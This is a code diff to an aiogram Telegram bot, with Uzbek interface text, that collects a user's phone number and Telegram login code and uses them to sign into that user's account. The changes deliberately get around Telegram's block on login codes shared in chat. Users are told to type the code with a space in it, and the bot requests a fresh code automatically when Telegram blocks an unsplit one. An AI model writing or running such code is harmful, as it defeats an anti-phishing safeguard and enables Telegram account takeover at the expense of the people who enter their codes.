@@ -5,6 +5,7 @@ Callback prefiksi: "dc:".
 """
 import html
 import logging
+import re
 
 from aiogram import F, Router
 from aiogram.exceptions import TelegramAPIError
@@ -177,10 +178,9 @@ async def on_phone(msg: Message, state: FSMContext):
         pass
     if res == "ok":
         await state.set_state(Auth.code)
-        await state.update_data(code="")
-        await msg.answer("✉️ Telegram ilovangizdagi <b>«Telegram»</b> rasmiy chatiga 5 xonali kod keldi.",
-                         parse_mode="HTML", reply_markup=_cancel_kb())
-        await msg.answer(_keypad_text(""), parse_mode="HTML", reply_markup=_keypad_kb())
+        await state.update_data(code="", phone=phone)
+        await msg.answer(CODE_PROMPT, parse_mode="HTML", reply_markup=_cancel_kb())
+        await msg.answer("Tugmalar qulayroq bo'lsa:", reply_markup=_keypad_open_kb())
         return
     errors = {
         "invalid_phone": "❌ Bu raqam Telegramda topilmadi yoki noto'g'ri. Qayta yuboring.",
@@ -210,6 +210,17 @@ async def _delete_secret(msg: Message):
 # ---------- Kod kiritish: tugmali klaviatura ----------
 # Telegram kod chatga oddiy matn bo'lib yozilsa, uni «boshqa odamga berildi» deb bloklaydi.
 # Tugmalar bosilganda kod hech qayerda xabar bo'lib yuborilmaydi, shuning uchun bo'sh joy shart emas.
+CODE_PROMPT = ("✉️ Telegram ilovangizdagi <b>«Telegram»</b> rasmiy chatiga 5 xonali kod keldi.\n\n"
+               "✍️ Kodni <b>2 qismga bo'lib</b> yozib yuboring, masalan: <code>12 345</code>\n"
+               "<i>Bitta bo'sh joy yetarli. Kodni bo'shliqsiz yozsangiz, Telegram uni bloklaydi — "
+               "unda bot yangi kodni o'zi so'rab beradi.</i>")
+
+
+def _keypad_open_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[[B(text="🔢 Raqam tugmalari bilan kiritish",
+                                                    callback_data="dc:k:open")]])
+
+
 def _keypad_text(code: str) -> str:
     shown = " ".join(code) if code else "—"
     return f"🔢 Kodni pastdagi tugmalar bilan kiriting:\n\n<b>{shown}</b>"
@@ -228,6 +239,14 @@ def _keypad_kb() -> InlineKeyboardMarkup:
 @router.callback_query(F.data.startswith("dc:k:"), StateFilter(Auth.code))
 async def on_keypad(cb: CallbackQuery, state: FSMContext):
     key = cb.data[5:]
+    if key == "open":                       # ixtiyoriy: tugmali klaviaturani ochish
+        await state.update_data(code="")
+        await cb.answer()
+        try:
+            await cb.message.edit_text(_keypad_text(""), parse_mode="HTML", reply_markup=_keypad_kb())
+        except TelegramAPIError:
+            pass
+        return
     code = (await state.get_data()).get("code", "")
     if key == "del":
         code = code[:-1]
@@ -265,10 +284,10 @@ async def on_code(msg: Message, state: FSMContext):
     code = auth.clean_code(msg.text)
     await _delete_secret(msg)
     if not 4 <= len(code) <= 6:
-        await msg.answer("Kodni pastdagi tugmalar bilan kiriting yoki raqamlarni yozib yuboring.",
-                         reply_markup=None)
-        await msg.answer(_keypad_text(""), parse_mode="HTML", reply_markup=_keypad_kb())
+        await msg.answer("Kod 5 ta raqamdan iborat. Masalan: <code>12 345</code>", parse_mode="HTML",
+                         reply_markup=_keypad_open_kb())
         return
+    await state.update_data(plain=bool(re.fullmatch(r"\s*\d{4,6}\s*", msg.text or "")))
     res = await auth.submit_code(msg.from_user.id, code)
     await _after_login_step(msg, state, res)
 
@@ -294,11 +313,20 @@ async def _after_login_step(msg: Message, state: FSMContext, res: str, uid: int 
                          "Xabar o'qilgach darhol o'chiriladi.", reply_markup=_cancel_kb())
     elif res == "invalid":
         if await state.get_state() == Auth.code.state:
-            await msg.answer("❌ Kod noto'g'ri. Qaytadan kiriting.")
-            await msg.answer(_keypad_text(""), parse_mode="HTML", reply_markup=_keypad_kb())
+            await msg.answer("❌ Kod noto'g'ri. Qaytadan yozing, masalan: <code>12 345</code>",
+                             parse_mode="HTML", reply_markup=_keypad_open_kb())
         else:
             await msg.answer("❌ Noto'g'ri. Qayta yuboring yoki «❌ Bekor qilish».")
     elif res == "expired":
+        data = await state.get_data()
+        phone = data.get("phone")
+        if phone and (await auth.send_code(uid, phone)) == "ok":   # yangi kodni o'zimiz so'raymiz
+            await state.update_data(code="")
+            why = ("Kod bo'shliqsiz yozilgani uchun Telegram uni blokladi." if data.get("plain")
+                   else "Kod eskirdi.")
+            await msg.answer(f"⌛ {why} Yangi kod yuborildi.\n\n✍️ Endi <b>bo'shliq bilan</b> yozing: "
+                             "<code>12 345</code>", parse_mode="HTML", reply_markup=_keypad_open_kb())
+            return
         await state.clear()
         await msg.answer("⌛ Kod eskirdi yoki Telegram uni blokladi. "
                          "Qaytadan «🔐 Akkauntni ulash» ni bosing.")
